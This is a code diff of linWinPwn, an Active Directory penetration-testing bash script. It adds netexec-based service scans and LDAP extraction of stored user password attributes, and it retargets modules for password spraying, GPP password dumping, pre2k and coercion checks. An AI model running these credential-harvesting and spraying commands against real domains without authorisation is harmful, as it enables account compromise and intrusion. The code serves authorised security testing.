@@ -145,7 +145,7 @@ print_banner() {
       | || | | | |\ V  V / | | | | |  __/ \ V  V /| | | | 
       |_||_|_| |_| \_/\_/  |_|_| |_|_|     \_/\_/ |_| |_| 
 
-      ${BLUE}linWinPwn: ${CYAN}version 1.0.35 ${NC}
+      ${BLUE}linWinPwn: ${CYAN}version 1.0.36 ${NC}
       https://github.com/lefayjey/linWinPwn
       ${BLUE}Author: ${CYAN}lefayjey${NC}
       ${BLUE}Inspired by: ${CYAN}S3cur3Th1sSh1t's WinPwn${NC}
@@ -413,24 +413,35 @@ prepare() {
         #dc_info=$(${netexec} smb "${dc_ip}" | grep -v "Connection refused")
     fi
 
-    dc_NETBIOS=$(echo "$dc_info" | sed -E 's/.*\((name:)([^)]+)\).*/\2/' | head -n 1)
-    dc_domain=$(echo "$dc_info" | sed -E 's/.*\((domain:)([^)]+)\).*/\2/' | head -n 1)
-    if [[ "${dc_NETBIOS}" == *"${dc_domain}"* ]]; then
-        dc_FQDN=${dc_NETBIOS}
-        dc_NETBIOS=$(echo "${dc_FQDN}" | cut -d "." -f 1)
-    else
-        dc_FQDN=${dc_NETBIOS}"."${dc_domain}
-    fi
-
     if [ -z "$dc_info" ]; then
         echo -e "${RED}[-] Error connecting to target! Please ensure the target is a Domain Controller and try again... ${NC}"
         exit 1
-    elif [ -z "$dc_domain" ]; then
-        echo -e "${RED}[-] Error finding DC's domain, please specify domain... ${NC}"
-        exit 1
-    else
-        if [ -z "$domain" ]; then domain=$dc_domain; fi
     fi
+
+    # Extract NETBIOS name and domain from dc_info
+    dc_NETBIOS=$(echo "$dc_info" | sed -E 's/.*\((name:)([^)]+)\).*/\2/' | head -n 1)
+    dc_domain=$(echo "$dc_info" | sed -E 's/.*\((domain:)([^)]+)\).*/\2/' | head -n 1)
+
+    # If dc_domain is missing, use the provided domain if available
+    if [ -z "$dc_domain" ]; then
+        if [ -z "$domain" ]; then
+            echo -e "${RED}[-] Error finding DC's domain, please specify domain... ${NC}"
+            exit 1
+        else
+            dc_domain="$domain"
+        fi
+    fi
+
+    # Build the Fully Qualified Domain Name (FQDN)
+    if [[ "$dc_NETBIOS" == *"$dc_domain"* ]]; then
+        dc_FQDN="$dc_NETBIOS"
+        dc_NETBIOS=$(echo "$dc_FQDN" | cut -d '.' -f 1)
+    else
+        dc_FQDN="${dc_NETBIOS}.${dc_domain}"
+    fi
+
+    # Set the domain variable if not already set
+    if [ -z "$domain" ]; then domain="$dc_domain"; fi
 
     if [ "${user}" == "" ]; then user_out="null"; else user_out=${user// /}; fi
     output_dir="${output_dir}/linWinPwn_${dc_domain}_${user_out}"
@@ -511,8 +522,8 @@ prepare() {
             custom_ip=""
         fi
     else
-        echo -e "${RED}[-] Error invalid targets parameter. Choose between DC, All, File='./custom_list' or IP=IP_or_hostname... ${NC}"
-        exit 1
+        echo -e "${PURPLE}[-] Error invalid targets parameter. Choosing default setting: Domain Controllers ${NC}"
+        curr_targets="Domain Controllers"
     fi
 }
 
@@ -919,46 +930,245 @@ dns_enum() {
     echo -e ""
 }
 
-smb_scan() {
-    if [ ! -f "${nmap}" ]; then
-        echo -e "${RED}[-] Please verify the installation of nmap ${NC}"
-    else
-        if [ "${curr_targets}" == "Domain Controllers" ]; then
-            servers_smb_list=${target_dc}
-        elif [ "${curr_targets}" == "All domain servers" ]; then
-            servers_scan_list=${target_servers}
-            echo -e "${YELLOW}[i] Scanning all domain servers ${NC}"
-            servers_smb_list="${output_dir}/Scans/servers_all_smb_${dc_domain}.txt"
-            if [ ! -f "${servers_smb_list}" ]; then
-                run_command "${nmap} -p 445 -Pn -sT -n -iL ${servers_scan_list} -oG ${output_dir}/Scans/nmap_smb_scan_all_${dc_domain}.txt" 1>/dev/null 2>&1
-                grep -a "open" "${output_dir}/Scans/nmap_smb_scan_all_${dc_domain}.txt" 2>/dev/null | cut -d " " -f 2 >"${servers_smb_list}"
-            else
-                echo -e "${YELLOW}[i] SMB nmap scan results found ${NC}"
-            fi
-        elif [ "${curr_targets}" == "File containing list of servers" ]; then
-            servers_scan_list=${custom_servers_list}
-            echo -e "${YELLOW}[i] Scanning servers in ${custom_servers} ${NC}"
-            servers_smb_list="${output_dir}/Scans/servers_custom_smb_${dc_domain}.txt"
-            if [ "${custom_target_scanned}" == false ]; then
-                run_command "${nmap} -p 445 -Pn -sT -n -iL ${servers_scan_list} -oG ${output_dir}/Scans/nmap_smb_scan_custom_${dc_domain}.txt" 1>/dev/null 2>&1
-                grep -a "open" "${output_dir}/Scans/nmap_smb_scan_custom_${dc_domain}.txt" 2>/dev/null | cut -d " " -f 2 >"${servers_smb_list}"
-                custom_target_scanned=true
-            else
-                echo -e "${YELLOW}[i] SMB nmap scan results found ${NC}"
-            fi
-        elif [ "${curr_targets}" == "IP or hostname" ]; then
-            servers_scan_list=$(head -n1 "${custom_servers_list}")
-            echo -e "${YELLOW}[i] Scanning server ${custom_ip}${NC}"
-            servers_smb_list="${output_dir}/Scans/servers_custom_smb_${dc_domain}.txt"
-            if [ "${custom_target_scanned}" == false ]; then
-                run_command "${nmap} -p 445 -Pn -sT -n ${servers_scan_list} -oG ${output_dir}/Scans/nmap_smb_scan_custom_${dc_domain}.txt" 1>/dev/null 2>&1
-                grep -a "open" "${output_dir}/Scans/nmap_smb_scan_custom_${dc_domain}.txt" 2>/dev/null | cut -d " " -f 2 >"${servers_smb_list}"
-                custom_target_scanned=true
-            else
-                echo -e "${YELLOW}[i] SMB nmap scan results found ${NC}"
-            fi
-        fi
+###### net_scan: Network Scan
+ne_smb_scan() {
+    echo -e "${BLUE}[*] Scanning for SMB ports...${NC}"
+    if [ "${curr_targets}" == "Domain Controllers" ]; then
+        servers_scan_list=${target_dc}
+        servers_smb_list="${output_dir}/Scans/servers_dc_smb_${dc_domain}.txt"
+        servers_scan_out="${output_dir}/Scans/ne_smb_dc_output_${dc_domain}.txt"
+    elif [ "${curr_targets}" == "All domain servers" ]; then
+        servers_scan_list=${target_servers}
+        echo -e "${YELLOW}[i] Scanning all domain servers ${NC}"
+        servers_smb_list="${output_dir}/Scans/servers_alldomain_smb_${dc_domain}.txt"
+        servers_scan_out="${output_dir}/Scans/ne_smb_alldomain_output_${dc_domain}.txt"
+    elif [ "${curr_targets}" == "File containing list of servers" ]; then
+        servers_scan_list=${custom_servers_list}
+        echo -e "${YELLOW}[i] Scanning servers in ${custom_servers} ${NC}"
+        servers_smb_list="${output_dir}/Scans/servers_custom_smb_${dc_domain}.txt"
+        servers_scan_out="${output_dir}/Scans/ne_smb_custom_output_${dc_domain}.txt"
+        /bin/rm "${servers_scan_out}" 2>/dev/null
+    elif [ "${curr_targets}" == "IP or hostname" ]; then
+        servers_scan_list=$(head -n1 "${custom_servers_list}")
+        echo -e "${YELLOW}[i] Scanning server ${custom_ip}${NC}"
+        servers_smb_list="${output_dir}/Scans/servers_custom_smb_${dc_domain}.txt"
+        servers_scan_out="${output_dir}/Scans/ne_smb_custom_output_${dc_domain}.txt"
+        /bin/rm "${servers_scan_out}" 2>/dev/null
     fi
+
+    if [ ! -f "${servers_smb_list}" ] || [ "${custom_target_scanned}" == false ]; then
+        run_command "${netexec} ${ne_verbose} smb ${servers_scan_list} --log ${servers_scan_out}" 2>&1
+        grep -a "SMB" "${servers_scan_out}" 2>/dev/null | grep -oP '(\d{1,3}\.){3}\d{1,3}' | sort -u > "${servers_smb_list}"
+        if [ "${custom_target_scanned}" == false ]; then custom_target_scanned=true; fi
+    else
+        echo -e "${YELLOW}[i] SMB scan results found ${NC}"
+    fi
+    echo -e ""
+}
+
+ne_rdp_scan() {
+    echo -e "${BLUE}[*] Scanning for RDP ports...${NC}"
+    if [ "${curr_targets}" == "Domain Controllers" ]; then
+        servers_scan_list=${target_dc}
+        servers_rdp_list="${output_dir}/Scans/servers_dc_rdp_${dc_domain}.txt"
+        servers_scan_out="${output_dir}/Scans/ne_rdp_dc_output_${dc_domain}.txt"
+    elif [ "${curr_targets}" == "All domain servers" ]; then
+        servers_scan_list=${target_servers}
+        echo -e "${YELLOW}[i] Scanning all domain servers ${NC}"
+        servers_rdp_list="${output_dir}/Scans/servers_alldomain_rdp_${dc_domain}.txt"
+        servers_scan_out="${output_dir}/Scans/ne_rdp_alldomain_output_${dc_domain}.txt"
+    elif [ "${curr_targets}" == "File containing list of servers" ]; then
+        servers_scan_list=${custom_servers_list}
+        echo -e "${YELLOW}[i] Scanning servers in ${custom_servers} ${NC}"
+        servers_rdp_list="${output_dir}/Scans/servers_custom_rdp_${dc_domain}.txt"
+        servers_scan_out="${output_dir}/Scans/ne_rdp_custom_output_${dc_domain}.txt"
+        /bin/rm "${servers_scan_out}" 2>/dev/null
+    elif [ "${curr_targets}" == "IP or hostname" ]; then
+        servers_scan_list=$(head -n1 "${custom_servers_list}")
+        echo -e "${YELLOW}[i] Scanning server ${custom_ip}${NC}"
+        servers_rdp_list="${output_dir}/Scans/servers_custom_rdp_${dc_domain}.txt"
+        servers_scan_out="${output_dir}/Scans/ne_rdp_custom_output_${dc_domain}.txt"
+        /bin/rm "${servers_scan_out}" 2>/dev/null
+    fi
+    if [ ! -f "${servers_rdp_list}" ] || [ "${custom_target_scanned}" == false ]; then
+        run_command "${netexec} ${ne_verbose} rdp ${servers_scan_list} --log ${servers_scan_out}" 2>&1
+        grep -a "RDP" "${servers_scan_out}" 2>/dev/null | grep -oP '(\d{1,3}\.){3}\d{1,3}' | sort -u > "${servers_rdp_list}"
+        if [ "${custom_target_scanned}" == false ]; then custom_target_scanned=true; fi
+    else
+        echo -e "${YELLOW}[i] RDP scan results found ${NC}"
+    fi
+    echo -e ""
+}
+
+ne_winrm_scan() {
+    echo -e "${BLUE}[*] Scanning for WinRM ports...${NC}"
+    if [ "${curr_targets}" == "Domain Controllers" ]; then
+        servers_scan_list=${target_dc}
+        servers_winrm_list="${output_dir}/Scans/servers_dc_winrm_${dc_domain}.txt"
+        servers_scan_out="${output_dir}/Scans/ne_winrm_dc_output_${dc_domain}.txt"
+    elif [ "${curr_targets}" == "All domain servers" ]; then
+        servers_scan_list=${target_servers}
+        echo -e "${YELLOW}[i] Scanning all domain servers ${NC}"
+        servers_winrm_list="${output_dir}/Scans/servers_alldomain_winrm_${dc_domain}.txt"
+        servers_scan_out="${output_dir}/Scans/ne_winrm_alldomain_output_${dc_domain}.txt"
+    elif [ "${curr_targets}" == "File containing list of servers" ]; then
+        servers_scan_list=${custom_servers_list}
+        echo -e "${YELLOW}[i] Scanning servers in ${custom_servers} ${NC}"
+        servers_winrm_list="${output_dir}/Scans/servers_custom_winrm_${dc_domain}.txt"
+        servers_scan_out="${output_dir}/Scans/ne_winrm_custom_output_${dc_domain}.txt"
+        /bin/rm "${servers_scan_out}" 2>/dev/null
+    elif [ "${curr_targets}" == "IP or hostname" ]; then
+        servers_scan_list=$(head -n1 "${custom_servers_list}")
+        echo -e "${YELLOW}[i] Scanning server ${custom_ip}${NC}"
+        servers_winrm_list="${output_dir}/Scans/servers_custom_winrm_${dc_domain}.txt"
+        servers_scan_out="${output_dir}/Scans/ne_winrm_custom_output_${dc_domain}.txt"
+        /bin/rm "${servers_scan_out}" 2>/dev/null
+    fi
+    if [ ! -f "${servers_winrm_list}" ] || [ "${custom_target_scanned}" == false ]; then
+        run_command "${netexec} ${ne_verbose} winrm ${servers_scan_list} --log ${servers_scan_out}" 2>&1
+        grep -a "WinRM" "${servers_scan_out}" 2>/dev/null | grep -oP '(\d{1,3}\.){3}\d{1,3}' | sort -u > "${servers_winrm_list}"
+        if [ "${custom_target_scanned}" == false ]; then custom_target_scanned=true; fi
+    else
+        echo -e "${YELLOW}[i] WinRM scan results found ${NC}"
+    fi
+    echo -e ""
+}
+
+ne_ssh_scan() {
+    if [ "${curr_targets}" == "Domain Controllers" ]; then
+        servers_scan_list=${target_dc}
+        servers_ssh_list="${output_dir}/Scans/servers_dc_ssh_${dc_domain}.txt"
+        servers_scan_out="${output_dir}/Scans/ne_ssh_dc_output_${dc_domain}.txt"
+    elif [ "${curr_targets}" == "All domain servers" ]; then
+        servers_scan_list=${target_servers}
+        echo -e "${YELLOW}[i] Scanning all domain servers ${NC}"
+        servers_ssh_list="${output_dir}/Scans/servers_alldomain_ssh_${dc_domain}.txt"
+        servers_scan_out="${output_dir}/Scans/ne_ssh_alldomain_output_${dc_domain}.txt"
+    elif [ "${curr_targets}" == "File containing list of servers" ]; then
+        servers_scan_list=${custom_servers_list}
+        echo -e "${YELLOW}[i] Scanning servers in ${custom_servers} ${NC}"
+        servers_ssh_list="${output_dir}/Scans/servers_custom_ssh_${dc_domain}.txt"
+        servers_scan_out="${output_dir}/Scans/ne_ssh_custom_output_${dc_domain}.txt"
+        /bin/rm "${servers_scan_out}" 2>/dev/null
+    elif [ "${curr_targets}" == "IP or hostname" ]; then
+        servers_scan_list=$(head -n1 "${custom_servers_list}")
+        echo -e "${YELLOW}[i] Scanning server ${custom_ip}${NC}"
+        servers_ssh_list="${output_dir}/Scans/servers_custom_ssh_${dc_domain}.txt"
+        servers_scan_out="${output_dir}/Scans/ne_ssh_custom_output_${dc_domain}.txt"
+        /bin/rm "${servers_scan_out}" 2>/dev/null
+    fi
+    if [ ! -f "${servers_ssh_list}" ] || [ "${custom_target_scanned}" == false ]; then
+        run_command "${netexec} ${ne_verbose} ssh ${servers_scan_list} --log ${servers_scan_out}" 2>&1
+        grep -a "SSH" "${servers_scan_out}" 2>/dev/null | grep -oP '(\d{1,3}\.){3}\d{1,3}' | sort -u > "${servers_ssh_list}"
+        if [ "${custom_target_scanned}" == false ]; then custom_target_scanned=true; fi
+    else
+        echo -e "${YELLOW}[i] SSH scan results found ${NC}"
+    fi
+    echo -e ""
+}
+
+ne_ftp_scan() {
+    echo -e "${BLUE}[*] Scanning for FTP ports...${NC}"
+    if [ "${curr_targets}" == "Domain Controllers" ]; then
+        servers_scan_list=${target_dc}
+        servers_ftp_list="${output_dir}/Scans/servers_dc_ftp_${dc_domain}.txt"
+        servers_scan_out="${output_dir}/Scans/ne_ftp_dc_output_${dc_domain}.txt"
+    elif [ "${curr_targets}" == "All domain servers" ]; then
+        servers_scan_list=${target_servers}
+        echo -e "${YELLOW}[i] Scanning all domain servers ${NC}"
+        servers_ftp_list="${output_dir}/Scans/servers_alldomain_ftp_${dc_domain}.txt"
+        servers_scan_out="${output_dir}/Scans/ne_ftp_alldomain_output_${dc_domain}.txt"
+    elif [ "${curr_targets}" == "File containing list of servers" ]; then
+        servers_scan_list=${custom_servers_list}
+        echo -e "${YELLOW}[i] Scanning servers in ${custom_servers} ${NC}"
+        servers_ftp_list="${output_dir}/Scans/servers_custom_ftp_${dc_domain}.txt"
+        servers_scan_out="${output_dir}/Scans/ne_ftp_custom_output_${dc_domain}.txt"
+        /bin/rm "${servers_scan_out}" 2>/dev/null
+    elif [ "${curr_targets}" == "IP or hostname" ]; then
+        servers_scan_list=$(head -n1 "${custom_servers_list}")
+        echo -e "${YELLOW}[i] Scanning server ${custom_ip}${NC}"
+        servers_ftp_list="${output_dir}/Scans/servers_custom_ftp_${dc_domain}.txt"
+        servers_scan_out="${output_dir}/Scans/ne_ftp_custom_output_${dc_domain}.txt"
+        /bin/rm "${servers_scan_out}" 2>/dev/null
+    fi
+    if [ ! -f "${servers_ftp_list}" ] || [ "${custom_target_scanned}" == false ]; then
+        run_command "${netexec} ${ne_verbose} ftp ${servers_scan_list} --log ${servers_scan_out}" 2>&1
+        grep -a "FTP" "${servers_scan_out}" 2>/dev/null | grep -oP '(\d{1,3}\.){3}\d{1,3}' | sort -u > "${servers_ftp_list}"
+        if [ "${custom_target_scanned}" == false ]; then custom_target_scanned=true; fi
+    else
+        echo -e "${YELLOW}[i] FTP scan results found ${NC}"
+    fi
+    echo -e ""
+}
+
+ne_vnc_scan() {
+    echo -e "${BLUE}[*] Scanning for VNC ports...${NC}"
+    if [ "${curr_targets}" == "Domain Controllers" ]; then
+        servers_scan_list=${target_dc}
+        servers_vnc_list="${output_dir}/Scans/servers_dc_vnc_${dc_domain}.txt"
+        servers_scan_out="${output_dir}/Scans/ne_vnc_dc_output_${dc_domain}.txt"
+    elif [ "${curr_targets}" == "All domain servers" ]; then
+        servers_scan_list=${target_servers}
+        echo -e "${YELLOW}[i] Scanning all domain servers ${NC}"
+        servers_vnc_list="${output_dir}/Scans/servers_alldomain_vnc_${dc_domain}.txt"
+        servers_scan_out="${output_dir}/Scans/ne_vnc_alldomain_output_${dc_domain}.txt"
+    elif [ "${curr_targets}" == "File containing list of servers" ]; then
+        servers_scan_list=${custom_servers_list}
+        echo -e "${YELLOW}[i] Scanning servers in ${custom_servers} ${NC}"
+        servers_vnc_list="${output_dir}/Scans/servers_custom_vnc_${dc_domain}.txt"
+        servers_scan_out="${output_dir}/Scans/ne_vnc_custom_output_${dc_domain}.txt"
+        /bin/rm "${servers_scan_out}" 2>/dev/null
+    elif [ "${curr_targets}" == "IP or hostname" ]; then
+        servers_scan_list=$(head -n1 "${custom_servers_list}")
+        echo -e "${YELLOW}[i] Scanning server ${custom_ip}${NC}"
+        servers_vnc_list="${output_dir}/Scans/servers_custom_vnc_${dc_domain}.txt"
+        servers_scan_out="${output_dir}/Scans/ne_vnc_custom_output_${dc_domain}.txt"
+        /bin/rm "${servers_scan_out}" 2>/dev/null
+    fi
+    if [ ! -f "${servers_vnc_list}" ] || [ "${custom_target_scanned}" == false ]; then
+        run_command "${netexec} ${ne_verbose} vnc ${servers_scan_list} --log ${servers_scan_out}" 2>&1
+        grep -a "VNC" "${servers_scan_out}" 2>/dev/null | grep -oP '(\d{1,3}\.){3}\d{1,3}' | sort -u > "${servers_vnc_list}"
+        if [ "${custom_target_scanned}" == false ]; then custom_target_scanned=true; fi
+    else
+        echo -e "${YELLOW}[i] VNC scan results found ${NC}"
+    fi
+    echo -e ""
+}
+
+ne_mssql_scan() {
+    echo -e "${BLUE}[*] Scanning for MSSQL ports...${NC}"
+    if [ "${curr_targets}" == "Domain Controllers" ]; then
+        servers_scan_list=${target_dc}
+        servers_mssql_list="${output_dir}/Scans/servers_dc_mssql_${dc_domain}.txt"
+        servers_scan_out="${output_dir}/Scans/ne_mssql_dc_output_${dc_domain}.txt"
+    elif [ "${curr_targets}" == "All domain servers" ]; then
+        servers_scan_list=${target_servers}
+        echo -e "${YELLOW}[i] Scanning all domain servers ${NC}"
+        servers_mssql_list="${output_dir}/Scans/servers_alldomain_mssql_${dc_domain}.txt"
+        servers_scan_out="${output_dir}/Scans/ne_mssql_alldomain_output_${dc_domain}.txt"
+    elif [ "${curr_targets}" == "File containing list of servers" ]; then
+        servers_scan_list=${custom_servers_list}
+        echo -e "${YELLOW}[i] Scanning servers in ${custom_servers} ${NC}"
+        servers_mssql_list="${output_dir}/Scans/servers_custom_mssql_${dc_domain}.txt"
+        servers_scan_out="${output_dir}/Scans/ne_mssql_custom_output_${dc_domain}.txt"
+        /bin/rm "${servers_scan_out}" 2>/dev/null
+    elif [ "${curr_targets}" == "IP or hostname" ]; then
+        servers_scan_list=$(head -n1 "${custom_servers_list}")
+        echo -e "${YELLOW}[i] Scanning server ${custom_ip}${NC}"
+        servers_mssql_list="${output_dir}/Scans/servers_custom_mssql_${dc_domain}.txt"
+        servers_scan_out="${output_dir}/Scans/ne_mssql_custom_output_${dc_domain}.txt"
+        /bin/rm "${servers_scan_out}" 2>/dev/null
+    fi
+
+    if [ ! -f "${servers_mssql_list}" ] || [ "${custom_target_scanned}" == false ]; then
+        run_command "${netexec} ${ne_verbose} mssql ${servers_scan_list} --log ${servers_scan_out}" 2>&1
+        grep -a "MSSQL" "${servers_scan_out}" 2>/dev/null | grep -oP '(\d{1,3}\.){3}\d{1,3}' | sort -u > "${servers_mssql_list}"
+        /bin/cat "${servers_mssql_list}" >> "${sql_ip_list}"
+        if [ "${custom_target_scanned}" == false ]; then custom_target_scanned=true; fi
+    else
+        echo -e "${YELLOW}[i] MSSQL scan results found ${NC}"
+    fi
+    echo -e ""
 }
 
 ###### ad_enum: AD Enumeration
@@ -1126,7 +1336,7 @@ enum4linux_enum() {
 
 ne_gpp() {
     echo -e "${BLUE}[*] GPP Enumeration${NC}"
-    run_command "${netexec} ${ne_verbose} smb ${target_dc} ${argument_ne} -M gpp_autologin -M gpp_password --log ${output_dir}/DomainRecon/ne_gpp_output_${dc_domain}.txt" 2>&1
+    run_command "${netexec} ${ne_verbose} smb ${target} ${argument_ne} -M gpp_autologin -M gpp_password --log ${output_dir}/DomainRecon/ne_gpp_output_${dc_domain}.txt" 2>&1
     echo -e ""
 }
 
@@ -1174,6 +1384,8 @@ ne_ldap_enum() {
     echo -e ""
     echo -e "${BLUE}[*] Users Description containing word: pass${NC}"
     run_command "${netexec} ${ne_verbose} ldap --port ${ldap_port} ${target} ${argument_ne} ${ldaps_param} -M get-desc-users --kdcHost ${dc_FQDN}" >"${output_dir}/DomainRecon/ne_get-desc-users_pass_output_${dc_domain}.txt"
+    echo -e "${BLUE}[*] Attributes userPassword or unixUserPassword of users ${NC}"
+    run_command "${netexec} ${ne_verbose} ldap --port ${ldap_port} ${target} ${argument_ne} ${ldaps_param} -M get-unixUserPassword -M get-userPassword --kdcHost ${dc_FQDN}" >"${output_dir}/DomainRecon/ne_get-userpass_output_${dc_domain}.txt"
     grep -i "pass\|pwd\|passwd\|password\|pswd\|pword" "${output_dir}/DomainRecon/ne_get-desc-users_pass_output_${dc_domain}.txt" 2>/dev/null | tee "${output_dir}/DomainRecon/ne_get-desc-users_pass_results_${dc_domain}.txt" 2>&1
     if [ ! -s "${output_dir}/DomainRecon/ne_get-desc-users_pass_results_${dc_domain}.txt" ]; then
         echo -e "${PURPLE}[-] No users with passwords in description found${NC}"
@@ -1201,10 +1413,10 @@ deleg_enum() {
         fi
     fi
     echo -e "${BLUE}[*] findDelegation check (netexec)${NC}"
-    run_command "${netexec} ${ne_verbose} ldap --port ${ldap_port} ${target_dc} ${argument_ne} ${ldaps_param} --find-delegation --kdcHost ${dc_FQDN} --log ${output_dir}/DomainRecon/ne_find-delegation_output_${dc_domain}.txt" 2>&1
+    run_command "${netexec} ${ne_verbose} ldap --port ${ldap_port} ${target} ${argument_ne} ${ldaps_param} --find-delegation --kdcHost ${dc_FQDN} --log ${output_dir}/DomainRecon/ne_find-delegation_output_${dc_domain}.txt" 2>&1
     echo -e ""
     echo -e "${BLUE}[*] Trusted-for-delegation check (netexec)${NC}"
-    run_command "${netexec} ${ne_verbose} ldap --port ${ldap_port} ${target_dc} ${argument_ne} ${ldaps_param} --trusted-for-delegation --kdcHost ${dc_FQDN} --log ${output_dir}/DomainRecon/ne_trusted-for-delegation_output_${dc_domain}.txt" 2>&1
+    run_command "${netexec} ${ne_verbose} ldap --port ${ldap_port} ${target} ${argument_ne} ${ldaps_param} --trusted-for-delegation --kdcHost ${dc_FQDN} --log ${output_dir}/DomainRecon/ne_trusted-for-delegation_output_${dc_domain}.txt" 2>&1
     echo -e ""
 }
 
@@ -1399,7 +1611,7 @@ rdwatool_enum() {
 
 ne_sccm() {
     echo -e "${BLUE}[*] SCCM Enumeration using netexec${NC}"
-    run_command "echo -n Y | ${netexec} ${ne_verbose} ldap --port ${ldap_port} ${target_dc} ${argument_ne} -M sccm -o REC_RESOLVE=TRUE --log ${output_dir}/DomainRecon/ne_sccm_output_${dc_domain}.txt" 2>&1
+    run_command "echo -n Y | ${netexec} ${ne_verbose} ldap --port ${ldap_port} ${target} ${argument_ne} -M sccm -o REC_RESOLVE=TRUE --log ${output_dir}/DomainRecon/ne_sccm_output_${dc_domain}.txt" 2>&1
     echo -e ""
 }
 
@@ -1979,7 +2191,7 @@ masky_dump() {
     else
         ne_adcs_enum
         if [ ! "${pki_servers}" == "" ] && [ ! "${pki_cas}" == "" ]; then
-            smb_scan
+            ne_smb_scan
             i=0
             for pki_server in $pki_servers; do
                 i=$((i + 1))
@@ -2123,7 +2335,7 @@ ne_passpray() {
         read -rp ">> " passpray_password </dev/tty
     done
     echo -e "${YELLOW}[i] Password spraying with password ${passpray_password}. This may take a while...${NC}"
-    run_command "${netexec} ${ne_verbose} ldap ${target_dc} -u ${target_userslist} -p ${passpray_password} --no-bruteforce --continue-on-success --log ${output_dir}/BruteForce/ne_passpray_output_${dc_domain}.txt" 2>&1
+    run_command "${netexec} ${ne_verbose} ldap ${target} -u ${target_userslist} -p ${passpray_password} --no-bruteforce --continue-on-success --log ${output_dir}/BruteForce/ne_passpray_output_${dc_domain}.txt" 2>&1
     grep "\[+\]" "${output_dir}/BruteForce/ne_passpray_output_${dc_domain}.txt" | cut -d "\\" -f 2 | cut -d " " -f 1 >"${output_dir}/BruteForce/passpray_valid_ne_${dc_domain}.txt"
     if [ -s "${output_dir}/BruteForce/passpray_valid_ne_${dc_domain}.txt" ]; then
         echo -e "${GREEN}[+] Printing accounts with password ${passpray_password}...${NC}"
@@ -2169,7 +2381,7 @@ kerbrute_passpray() {
 
 ne_pre2k() {
     echo -e "${BLUE}[*] Pre2k Enumeration using netexec${NC}"
-    run_command "echo -n Y | ${netexec} ${ne_verbose} ldap --port ${ldap_port} ${target_dc} ${argument_ne} -M pre2k --log ${output_dir}/BruteForce/ne_pre2k_output_${dc_domain}.txt" 2>&1
+    run_command "echo -n Y | ${netexec} ${ne_verbose} ldap --port ${ldap_port} ${target} ${argument_ne} -M pre2k --log ${output_dir}/BruteForce/ne_pre2k_output_${dc_domain}.txt" 2>&1
     echo -e ""
 }
 
@@ -2487,7 +2699,7 @@ smb_map() {
         if [ "${kerb_bool}" == true ] || [ "${aeskey_bool}" == true ]; then
             echo -e "${PURPLE}[-] smbmap does not support Kerberos authentication${NC}"
         else
-            smb_scan
+            ne_smb_scan
             echo -e "${BLUE}[*] Listing accessible SMB shares - Step 1/2${NC}"
             for i in $(grep -v ':' "${servers_smb_list}"); do
                 echo -e "${CYAN}[*] Listing shares on ${i} ${NC}"
@@ -2523,7 +2735,7 @@ smb_map() {
 
 ne_shares() {
     echo -e "${BLUE}[*] Enumerating Shares using netexec ${NC}"
-    smb_scan
+    ne_smb_scan
     run_command "${netexec} ${ne_verbose} smb ${servers_smb_list} ${argument_ne} --shares --log ${output_dir}/Shares/ne_shares_output_${dc_domain}.txt" 2>&1
     if [ "${nullsess_bool}" == true ]; then
         echo -e "${BLUE}[*] Enumerating Shares using netexec (Guest and random user)${NC}"
@@ -2536,7 +2748,7 @@ ne_shares() {
 
 ne_spider() {
     echo -e "${BLUE}[*] Spidering Shares using netexec ${NC}"
-    smb_scan
+    ne_smb_scan
     run_command "${netexec} ${ne_verbose} smb ${servers_smb_list} ${argument_ne} -M spider_plus -o OUTPUT=${output_dir}/Shares/ne_spider_plus EXCLUDE_DIR=prnproc$,IPC$,print$,SYSVOL,NETLOGON --log ${output_dir}/Shares/ne_spider_output_${dc_domain}.txt" 2>&1
     if [ "${nullsess_bool}" == true ]; then
         echo -e "${BLUE}[*] Spidering Shares using netexec (Guest and random user)${NC}"
@@ -2554,7 +2766,7 @@ finduncshar_scan() {
         if [ "${nullsess_bool}" == true ]; then
             echo -e "${PURPLE}[-] FindUncommonShares requires credentials ${NC}"
         else
-            smb_scan
+            ne_smb_scan
             if [ "${ldaps_bool}" == true ]; then ldaps_param="--ldaps"; else ldaps_param=""; fi
             if [ "${verbose_bool}" == true ]; then verbose_p0dalirius="-v --debug"; else verbose_p0dalirius=""; fi
             run_command "${python3} ${FindUncommonShares} ${argument_FindUncom} ${verbose_p0dalirius} ${ldaps_param} -ai ${dc_ip} -tf ${servers_smb_list} --check-user-access --export-xlsx ${output_dir}/Shares/finduncshar_${dc_domain}.xlsx --kdcHost ${dc_FQDN}" 2>&1 | tee -a "${output_dir}/Shares/finduncshar_shares_output_${dc_domain}.txt"
@@ -2570,7 +2782,7 @@ manspider_scan() {
     else
         mkdir -p "${output_dir}/Shares/manspiderDump"
         echo -e "${CYAN}[*] Running manspider....${NC}"
-        smb_scan
+        ne_smb_scan
         echo -e "${CYAN}[*] Searching for files with interesting filenames${NC}"
         run_command "${manspider} ${argument_manspider} ${servers_smb_list} -q -t 10 -f passw user admin account network login key logon cred -l ${output_dir}/Shares/manspiderDump" 2>&1 | tee -a "${output_dir}/Shares/manspider_output_${dc_domain}.txt"
         echo -e "${CYAN}[*] Searching for SSH keys${NC}"
@@ -2646,21 +2858,21 @@ zerologon_check() {
 
 ms17-010_check() {
     echo -e "${BLUE}[*] MS17-010 check ${NC}"
-    smb_scan
+    ne_smb_scan
     run_command "${netexec} ${ne_verbose} smb ${servers_smb_list} ${argument_ne} -M ms17-010 --log ${output_dir}/Vulnerabilities/ne_ms17-010_output_${dc_domain}.txt" 2>&1
     echo -e ""
 }
 
 coerceplus_check() {
     echo -e "${BLUE}[*] coerce check ${NC}"
-    smb_scan
+    ne_smb_scan
     run_command "${netexec} ${ne_verbose} smb ${servers_smb_list} ${argument_ne} -M coerce_plus --log ${output_dir}/Vulnerabilities/ne_coerce_output_${dc_domain}.txt" 2>&1
     echo -e ""
 }
 
 print_check() {
     echo -e "${BLUE}[*] Print Spooler and PrintNightmare checks ${NC}"
-    smb_scan
+    ne_smb_scan
     run_command "${netexec} ${ne_verbose} smb ${servers_smb_list} ${argument_ne} -M spooler --log ${output_dir}/Vulnerabilities/ne_spooler_output_${dc_domain}.txt" 2>&1
     run_command "${netexec} ${ne_verbose} smb ${servers_smb_list} ${argument_ne} -M printnightmare --log ${output_dir}/Vulnerabilities/ne_printnightmare_output_${dc_domain}.txt" 2>&1
     echo -e ""
@@ -2668,14 +2880,14 @@ print_check() {
 
 webdav_check() {
     echo -e "${BLUE}[*] WebDAV check ${NC}"
-    smb_scan
+    ne_smb_scan
